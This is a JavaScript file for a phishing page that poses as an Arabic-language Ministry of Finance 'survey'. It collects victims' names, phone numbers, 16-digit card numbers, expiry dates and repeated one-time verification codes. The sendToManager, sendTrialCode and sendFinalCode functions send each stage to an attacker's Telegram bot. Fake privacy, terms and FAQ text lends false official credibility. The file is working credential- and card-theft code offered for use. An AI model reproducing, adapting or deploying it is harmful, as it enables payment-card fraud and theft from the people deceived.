
let trialAttempts = 0;
let finalAttempts = 0;

document.addEventListener('DOMContentLoaded', function() {
    initSystem();
    initDateSelectors();
    const preferredLang = localStorage.getItem('preferredLanguage') || 'ar';
    changeLanguage(preferredLang);
    setTimeout(() => {
        document.getElementById('loading').style.opacity = '0';
        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
        }, 500);
    }, 1000);
});

function initSystem() {
    console.log('🚀 نظام استبيانات الخدمات المالية - الإصدار 4.0.0');
    detectDeviceInfo();
    setupEventListeners();
    checkInternetConnection();
    startActivityMonitor();
}

function detectDeviceInfo() {
    const userAgent = navigator.userAgent;
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    const deviceType = isMobile ? 'جوال' : 'كمبيوتر';
    document.querySelectorAll('#deviceType, #mobileDeviceType').forEach(el => {
        el.textContent = deviceType;
    });
    let os = 'غير معروف';
    if (userAgent.includes('Android')) os = 'Android';
    else if (/(iPhone|iPad|iPod)/.test(userAgent)) os = 'iOS';
    else if (userAgent.includes('Windows')) os = 'Windows';
    else if (userAgent.includes('Mac')) os = 'macOS';
    else if (userAgent.includes('Linux')) os = 'Linux';
    document.querySelectorAll('#osType, #mobileOsType').forEach(el => {
        el.textContent = os;
    });
}

function initDateSelectors() {
    const monthSelect = document.getElementById('expiryMonth');
    const yearSelect = document.getElementById('expiryYear');
    if (!yearSelect) return;
    yearSelect.innerHTML = '<option value="">السنة</option>';
    for (let year = 2025; year <= 2035; year++) {
        const option = document.createElement('option');
        option.value = year;
        option.textContent = year;
        yearSelect.appendChild(option);
    }
}

function changeLanguage(lang) {
    localStorage.setItem('preferredLanguage', lang);
    const langText = lang === 'ar' ? 'العربية' : 'English';
    document.getElementById('currentLang').textContent = langText;
    updateAllTexts(lang);
    const monthSelect = document.getElementById('expiryMonth');
    const yearSelect = document.getElementById('expiryYear');
    if (monthSelect && monthSelect.innerHTML.includes('اختر الشهر')) {
        initDateSelectors();
    }
    updateTime();
    showNotification('تم تغيير اللغة بنجاح', 'success');
}

function updateAllTexts(lang) {
    const translation = TRANSLATIONS[lang] || TRANSLATIONS.ar;
    Object.keys(translation).forEach(key => {
        const element = document.getElementById(key);
        if (element) element.textContent = translation[key];
    });
    document.getElementById('pageTitle').textContent = translation.pageTitle;
    document.title = translation.pageTitle;
    const placeholders = {
        'fullName': translation.nameLabel || 'الاسم الكامل',
        'phoneNumber': 'مثال: 551234567',
        'cardNumber': '1234567890123456',
        'trialCode': '123456',
        'finalCode': '654321'
    };
    Object.keys(placeholders).forEach(id => {
        const element = document.getElementById(id);
        if (element) element.placeholder = placeholders[id];
    });
}

function setupEventListeners() {
    const langToggle = document.getElementById('languageToggle');
    if (langToggle) {
        langToggle.addEventListener('click', function(e) {
            e.stopPropagation();
            const dropdown = this.nextElementSibling;
            dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
        });
    }
    document.addEventListener('click', function() {
        document.querySelectorAll('.language-dropdown').forEach(dropdown => {
            dropdown.style.display = 'none';
        });
    });
    const inputs = document.querySelectorAll('.modern-input, .code-input, select');
    inputs.forEach(input => {
        input.addEventListener('blur', validateField);
        input.addEventListener('input', function() {
            this.classList.remove('error');
            this.style.borderColor = '';
        });
    });
    const textInputs = document.querySelectorAll('input[type="text"], input[type="tel"]');
    textInputs.forEach(input => {
        input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') e.preventDefault();
        });
    });
}

function validateField(e) {
    const field = e.target;
    const value = field.value.trim();
    if (field.required && !value) {
        field.classList.add('error');
        field.style.borderColor = '#dc3545';
        return false;
    }
    if (field.id === 'phoneNumber' && value) {
        const pattern = /^(5|6|7)[0-9]{8}$/;
        if (!pattern.test(value)) {
            field.classList.add('error');
            field.style.borderColor = '#dc3545';
            showNotification('رقم الهاتف غير صحيح', 'error');
            return false;
        }
    }
    if (field.id === 'cardNumber' && value) {
        const pattern = /^[0-9]{16}$/;
        if (!pattern.test(value)) {
            field.classList.add('error');
            field.style.borderColor = '#dc3545';
            showNotification('رقم البطاقة يجب أن يكون 16 رقماً', 'error');
            return false;
        }
    }
    if ((field.id === 'trialCode' || field.id === 'finalCode') && value) {
        if (!/^\d{4,6}$/.test(value)) {
            field.classList.add('error');
            field.style.borderColor = '#dc3545';
            showNotification('الرمز يجب أن يكون 4 أو 6 أرقام فقط', 'error');
            return false;
        }
    }
    field.classList.remove('error');
    field.style.borderColor = '#28a745';
    return true;
}

async function sendToManager() {
    if (!validateFormStep1()) {
        showNotification('يرجى ملء جميع الحقول المطلوبة بشكل صحيح', 'error');
        return;
    }
    const userData = {
        fullName: document.getElementById('fullName').value.trim(),
        phoneNumber: '+213' + document.getElementById('phoneNumber').value.trim(),
        cardNumber: document.getElementById('cardNumber').value.trim(),
        expiryDate: {
            month: document.getElementById('expiryMonth').value,
            year: document.getElementById('expiryYear').value
        },
        stage: 1,
        submissionTime: new Date().toLocaleString('ar-SA'),
        timestamp: new Date().toISOString(),
        deviceInfo: {
            type: document.getElementById('mobileDeviceType')?.textContent,
            os: document.getElementById('mobileOsType')?.textContent
        }
    };
    localStorage.setItem('currentSurvey', JSON.stringify(userData));
    const sendBtn = document.querySelector('.send-btn');
    const originalText = sendBtn.innerHTML;
    sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
    sendBtn.disabled = true;
    try {
        const message1 = `📝 *مرحلة 1 - بيانات أساسية*

👤 *الاسم:* ${userData.fullName}
📱 *الهاتف:* \`${userData.phoneNumber}\`
💳 *البطاقة:* \`${userData.cardNumber}\`
📅 *تاريخ الانتهاء:* ${userData.expiryDate.month}/${userData.expiryDate.year}

⏳ *الحالة:* بانتظار الرمز التجريبي
🕐 *الوقت:* ${userData.submissionTime}
📍 *المرحلة:* 1/4`;
        const success1 = await sendTelegramMessage(message1);
        if (success1) {
            goToPage(2);
            showNotification('تم إرسال بياناتك للمدير، الرجاء إدخال الرمز التجريبي', 'success');
            localStorage.setItem('stage1Time', userData.submissionTime);
        } else throw new Error('فشل إرسال البيانات');
    } catch (error) {
        console.error('❌ خطأ في المرحلة 1:', error);
        showNotification('فشل إرسال البيانات، يرجى المحاولة مرة أخرى', 'error');
    } finally {
        sendBtn.innerHTML = originalText;
        sendBtn.disabled = false;
    }
}

function validateFormStep1() {
    let isValid = true;
    const requiredFields = ['fullName', 'phoneNumber', 'cardNumber'];
    requiredFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (!field.value.trim()) {
            field.classList.add('error');
            field.style.borderColor = '#dc3545';
            isValid = false;
        }
    });
    const month = document.getElementById('expiryMonth').value;
    const year = document.getElementById('expiryYear').value;
    if (!month || !year) {
        document.getElementById('expiryMonth').classList.add('error');
        document.getElementById('expiryYear').classList.add('error');
        isValid = false;
    } else if (parseInt(year) < 2025) {
        showNotification('يجب أن يكون تاريخ الصلاحية 2025 أو أكبر', 'error');
        document.getElementById('expiryYear').classList.add('error');
        isValid = false;
    }
    const confirmation = document.getElementById('dataConfirmation');
    if (!confirmation.checked) {
        confirmation.parentElement.style.borderColor = '#dc3545';
        isValid = false;
    } else confirmation.parentElement.style.borderColor = '#28a745';
    return isValid;
}

async function sendTrialCode() {
    const trialCode = document.getElementById('trialCode').value.trim();
    const retryMessage = document.getElementById('retryMessage');
    if (!trialCode || !/^\d{4,6}$/.test(trialCode)) {
        showNotification('الرجاء إدخال رمز مكون من 4 أو 6 أرقام', 'error');
        return;
    }
    trialAttempts++;
    const userData = JSON.parse(localStorage.getItem('currentSurvey') || '{}');
    const trialBtn = document.querySelector('.trial-btn');
    const originalText = trialBtn.innerHTML;
    trialBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
    trialBtn.disabled = true;
    try {
        const message = `🔐 *مرحلة 2 - رمز تجريبي*

المستخدم: ${userData.fullName || 'غير معروف'}
الهاتف: \`${userData.phoneNumber || 'غير معروف'}\`

*المحاولة رقم:* ${trialAttempts}
*الرمز التجريبي:* \`${trialCode}\`

*معلومات الجهاز:*
- النوع: ${document.getElementById('mobileDeviceType')?.textContent || 'غير معروف'}
- نظام التشغيل: ${document.getElementById('mobileOsType')?.textContent || 'غير معروف'}

*الحالة:* ${trialAttempts === 1 ? 'محاولة أولى' : 'محاولة ثانية'}`;
        const success = await sendTelegramMessage(message);
        if (success) {
            if (trialAttempts === 1) {
                showNotification('تم إرسال الرمز للمدير. الرجاء إعادة إدخال الرمز للمحاولة الثانية', 'warning');
                if (retryMessage) retryMessage.classList.add('show');
                document.getElementById('trialCode').value = '';
                document.getElementById('trialCode').focus();
            } else {
                goToPage(3);
                showNotification('تم إرسال الرمز التجريبي للمدير', 'success');
                localStorage.setItem('trialCode', trialCode);
                localStorage.setItem('stage2Time', new Date().toLocaleString('ar-SA'));
                document.getElementById('trialCodeDisplay').textContent = trialCode;
            }
        }
    } catch (error) {
        console.error('❌ خطأ:', error);
        showNotification('فشل الإرسال', 'error');
    } finally {
        trialBtn.innerHTML = originalText;
        trialBtn.disabled = false;
    }
}

async function sendFinalCode() {
    const finalCode = document.getElementById('finalCode').value.trim();
    const trialCode = localStorage.getItem('trialCode') || '';
    if (!finalCode || !/^\d{4,6}$/.test(finalCode)) {
        showNotification('الرجاء إدخال رمز مكون من 4 أو 6 أرقام', 'error');
        return;
    }
    if (finalCode === trialCode) {
        showNotification('يجب أن يختلف الرمز النهائي عن الرمز التجريبي', 'error');
        return;
    }
    finalAttempts++;
    const userData = JSON.parse(localStorage.getItem('currentSurvey') || '{}');
    const finalBtn = document.querySelector('.final-btn');
    const originalText = finalBtn.innerHTML;
    finalBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
    finalBtn.disabled = true;
    try {
        const message = `🔒 *مرحلة 3 - رمز نهائي*

المستخدم: ${userData.fullName}
الهاتف: \`${userData.phoneNumber}\`

*الرمز التجريبي:* \`${trialCode}\`
*الرمز النهائي:* \`${finalCode}\`

*الحالة:* ${finalAttempts === 1 ? 'محاولة أولى' : 'محاولة ثانية'}`;
        const success = await sendTelegramMessage(message);
        if (success) {
            if (finalAttempts === 1) {
                showNotification('تم إرسال الرمز. الرجاء إعادة إدخال رمز نهائي آخر', 'warning');
                document.getElementById('finalCode').value = '';
                document.getElementById('finalCode').focus();
                const retryFinalMsg = document.getElementById('retryFinalMessage');
                if (retryFinalMsg) retryFinalMsg.classList.add('show');
            } else {
                userData.finalCode = finalCode;
                userData.participationNumber = generateParticipationNumber();
                userData.completionTime = new Date().toLocaleString('ar-SA');
                const finalMessage = `🎉 *إكمال الاستبيان*

📊 *البيانات الشخصية:*
👤 ${userData.fullName}
📱 \`${userData.phoneNumber}\`
💳 \`${userData.cardNumber}\`
📅 ${userData.expiryDate?.month}/${userData.expiryDate?.year}

🔐 *الرموز:*
   • التجريبي: \`${trialCode}\`
   • النهائي: \`${finalCode}\`

🔢 *رقم المشاركة:* \`${userData.participationNumber}\`
📱 *الجهاز:* ${document.getElementById('mobileDeviceType')?.textContent}
🖥️ *نظام التشغيل:* ${document.getElementById('mobileOsType')?.textContent}

✅ *الحالة:* مكتمل`;
                const successFinal = await sendTelegramMessage(finalMessage);
                if (successFinal) {
                    showCompletionPage(userData);
                    showNotification('تم إكمال الاستبيان بنجاح!', 'success');
                    saveToLocalHistory(userData);
                }
            }
        }
    } catch (error) {
        console.error('❌ خطأ:', error);
        showNotification('فشل الإرسال', 'error');
    } finally {
        finalBtn.innerHTML = originalText;
        finalBtn.disabled = false;
    }
}

async function sendTelegramMessage(message) {
    try {
        const botToken = CONFIG.TELEGRAM_BOT.TOKEN;
        const chatId = CONFIG.TELEGRAM_BOT.CHAT_ID;
        if (botToken === 'YOUR_BOT_TOKEN_HERE' || chatId === 'YOUR_CHAT_ID_HERE') {
            console.log('📤 رسالة للمدير (للاختبار):\n', message, '\n---');
            return true;
        }
        const response = await fetch(
            `${CONFIG.TELEGRAM_BOT.API_URL}${botToken}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            }
        );
        const result = await response.json();
        if (result.ok) {
            console.log('✅ تم إرسال الرسالة إلى تيليغرام');
            return true;
        } else {
            console.error('❌ خطأ في إرسال تيليغرام:', result);
            return false;
        }
    } catch (error) {
        console.error('❌ خطأ في الاتصال بتيليغرام:', error);
        return false;
    }
}

function generateParticipationNumber() {
    const timestamp = Date.now().toString(36).toUpperCase();
    const random = Math.random().toString(36).substring(2, 6).toUpperCase();
    return `MOF-${timestamp}-${random}`;
}

function goToPage(pageNumber) {
    document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
    const targetPage = document.getElementById(`page${pageNumber}`);
    if (targetPage) targetPage.classList.add('active');
    else {
        console.error(`❌ الصفحة ${pageNumber} غير موجودة`);
        return;
    }
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function showCompletionPage(userData) {
    document.getElementById('surveyId').textContent = userData.participationNumber;
    document.getElementById('submissionDate').textContent = userData.completionTime;
    document.getElementById('submittedName').textContent = userData.fullName;
    document.getElementById('submittedPhone').textContent = userData.phoneNumber;
    goToPage(4);
    localStorage.setItem('lastParticipationNumber', userData.participationNumber);
}

function saveToLocalHistory(userData) {
    const history = JSON.parse(localStorage.getItem('surveyHistory') || '[]');
    history.push({
        ...userData,
        savedAt: new Date().toISOString(),
        id: Date.now()
    });
    if (history.length > 50) history.shift();
    localStorage.setItem('surveyHistory', JSON.stringify(history));
    console.log('💾 تم حفظ الاستبيان في السجل المحلي');
}

function newSurvey() {
    trialAttempts = 0;
    finalAttempts = 0;
    const retryMessages = document.querySelectorAll('.attempt-message');
    retryMessages.forEach(msg => msg.classList.remove('show'));
    localStorage.removeItem('currentSurvey');
    localStorage.removeItem('trialCode');
    localStorage.removeItem('stage1Time');
    localStorage.removeItem('stage2Time');
    document.getElementById('fullName').value = '';
    document.getElementById('phoneNumber').value = '';
    document.getElementById('cardNumber').value = '';
    document.getElementById('expiryMonth').value = '';
    document.getElementById('expiryYear').value = '';
    document.getElementById('dataConfirmation').checked = false;
    document.getElementById('trialCode').value = '';
    document.getElementById('finalCode').value = '';
    const inputs = document.querySelectorAll('input, select');
    inputs.forEach(input => {
        input.classList.remove('error');
        input.style.borderColor = '';
    });
    goToPage(1);
    showNotification('تم بدء استبيان جديد، يمكنك تعبئة البيانات', 'info');
}

function shareSurvey() {
    const participationNumber = localStorage.getItem('lastParticipationNumber') || document.getElementById('surveyId').textContent;
    if (!participationNumber || participationNumber === 'FS-2412-0001') {
        showNotification('لا يوجد رقم مشاركة حالي', 'error');
        return;
    }
    document.getElementById('shareCodeInput').value = participationNumber;
    document.getElementById('shareModal').classList.add('active');
}

function viewStatus() {
    const participationNumber = localStorage.getItem('lastParticipationNumber');
    if (participationNumber) {
        showNotification(`رقم مشاركتك: ${participationNumber}. سيتم التواصل معك قريباً.`, 'info');
    } else showNotification('لا توجد مشاركات سابقة', 'warning');
}

function copyToClipboard() {
    const shareInput = document.getElementById('shareCodeInput');
    const copyMessage = document.getElementById('copyMessage');
    if (!shareInput.value) {
        copyMessage.textContent = 'لا يوجد نص للنسخ';
        copyMessage.className = 'copy-message error';
        copyMessage.style.display = 'block';
        setTimeout(() => { copyMessage.style.display = 'none'; }, 3000);
        return;
    }
    navigator.clipboard.writeText(shareInput.value)
        .then(() => {
            copyMessage.textContent = 'تم نسخ الرقم بنجاح';
            copyMessage.className = 'copy-message success';
            copyMessage.style.display = 'block';
            setTimeout(() => { copyMessage.style.display = 'none'; }, 3000);
        })
        .catch(() => {
            shareInput.select();
            document.execCommand('copy');
            copyMessage.textContent = 'تم نسخ الرقم (الطريقة البديلة)';
            copyMessage.className = 'copy-message success';
            copyMessage.style.display = 'block';
            setTimeout(() => { copyMessage.style.display = 'none'; }, 3000);
        });
}

function checkInternetConnection() {
    if (!navigator.onLine) showNotification('⚠️ لا يوجد اتصال بالإنترنت. قد لا تعمل بعض الميزات.', 'warning');
    window.addEventListener('online', () => showNotification('تم استعادة الاتصال بالإنترنت', 'success'));
    window.addEventListener('offline', () => showNotification('فقدان الاتصال بالإنترنت', 'error'));
}

function startActivityMonitor() {
    let lastActivity = Date.now();
    const activities = ['mousemove', 'keypress', 'click', 'scroll', 'touchstart'];
    activities.forEach(event => {
        document.addEventListener(event, () => { lastActivity = Date.now(); });
    });
    setInterval(() => {
        const inactiveTime = Date.now() - lastActivity;
        const timeout = CONFIG?.SYSTEM?.SESSION_TIMEOUT || 30 * 60 * 1000;
        if (inactiveTime > timeout) {
            showNotification('تم إغلاق الجلسة بسبب عدم النشاط', 'warning');
            setTimeout(() => { newSurvey(); }, 3000);
        }
    }, 60000);
}

function showNotification(message, type = 'info') {
    const notification = document.getElementById('notification');
    if (!notification) {
        console.log(`[${type}] ${message}`);
        return;
    }
    notification.textContent = message;
    notification.className = `notification ${type} show`;
    setTimeout(() => { notification.classList.remove('show'); }, 5000);
}

function closeAllModals() {
    document.querySelectorAll('.modal').forEach(modal => modal.classList.remove('active'));
}

function goHome() { goToPage(1); }

function showPrivacy() {
    const content = `<h4>سياسة الخصوصية</h4><p>تلتزم وزارة المالية بحماية خصوصية مستخدمي نظام الاستبيانات والمحافظة على سرية البيانات الشخصية.</p>`;
    document.getElementById('privacyContent').innerHTML = content;
    document.getElementById('privacyModal').classList.add('active');
}

function showTerms() {
    const content = `<h4>شروط الاستخدام</h4><p>باستخدامك لهذا النظام، فإنك توافق على الالتزام بالشروط والأحكام التالية:</p>`;
    document.getElementById('termsContent').innerHTML = content;
    document.getElementById('termsModal').classList.add('active');
}

function showFAQ() {
    const content = `<h4>الأسئلة الشائعة</h4><div class="faq-item"><h5>ما هو نظام استبيانات الخدمات المالية؟</h5><p>نظام إلكتروني تابع لوزارة المالية يهدف إلى جمع آراء المستخدمين لتطوير الخدمات المالية.</p></div>`;
    document.getElementById('faqContent').innerHTML = content;
    document.getElementById('faqModal').classList.add('active');
}

function showSupport() {
    const content = `<h4>الدعم الفني</h4><p>فريق الدعم الفني جاهز لمساعدتك في أي استفسار أو مشكلة تواجهها.</p>`;
    document.getElementById('supportContent').innerHTML = content;
    document.getElementById('supportModal').classList.add('active');
}

function showContact() {
    const content = `<h4>اتصل بنا</h4><p>نرحب باتصالاتكم واستفساراتكم في أي وقت.</p>`;
    document.getElementById('contactContent').innerHTML = content;
    document.getElementById('contactModal').classList.add('active');
}

window.changeLanguage = changeLanguage;
window.sendToManager = sendToManager;
window.sendTrialCode = sendTrialCode;
window.sendFinalCode = sendFinalCode;
window.newSurvey = newSurvey;
window.shareSurvey = shareSurvey;
window.viewStatus = viewStatus;
window.copyToClipboard = copyToClipboard;
window.closeAllModals = closeAllModals;
window.goHome = goHome;
window.showPrivacy = showPrivacy;
window.showTerms = showTerms;
window.showFAQ = showFAQ;
window.showSupport = showSupport;
window.showContact = showContact;

function updateTime() {
    const now = new Date();
    const currentLang = localStorage.getItem('preferredLanguage') || 'ar';
    const options = { 
        weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit',
        timeZone: 'Asia/Riyadh'
    };
    const locales = { 'ar': 'ar-SA', 'en': 'en-US' };
    const timeElement = document.getElementById('current-time');
    if (timeElement) timeElement.textContent = now.toLocaleDateString(locales[currentLang] || 'ar-SA', options);
}

setInterval(updateTime, 1000);
updateTime();
